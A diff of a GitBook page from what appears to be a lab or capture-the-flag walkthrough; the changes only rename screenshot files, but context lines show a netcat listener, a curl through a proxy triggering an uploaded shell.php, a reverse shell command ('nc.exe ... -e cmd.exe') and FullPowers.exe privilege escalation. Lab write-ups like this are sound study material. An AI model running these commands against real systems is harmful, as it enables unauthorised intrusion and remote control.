@@ -50,7 +50,7 @@ GitHub Repository
 
 Visual Inspection
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Version Number Exploit Enumeration
 
@@ -81,7 +81,7 @@ By adding the following configuration to Proxy Foxy, we can navigate to the 8080
 
 ### Port 8080 - HTTP Wampserver&#x20;
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>Wampserver</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>Wampserver</p></figcaption></figure>
 
 * After adding the proxy configuration, we are able to navigate to the site
 
@@ -195,7 +195,7 @@ sudo rlwrap nc -lnvp 443
 curl --proxy http://192.168.75.189:3128 -s http://192.168.75.189:8080/shell.php
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Stable Shell
 
@@ -222,7 +222,7 @@ sudo rlwrap nc -lnvp 80
 nc.exe 192.168.49.75 80 -e cmd.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -275,7 +275,7 @@ Run FullPowers.exe
 FullPowers.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>We now have SeImpersonatePrivilege</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>We now have SeImpersonatePrivilege</p></figcaption></figure>
 
 * I know from experience that this is an OG priv esc method
 
@@ -294,4 +294,4 @@ Execute exploit with command:
 
 ## Proofs
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
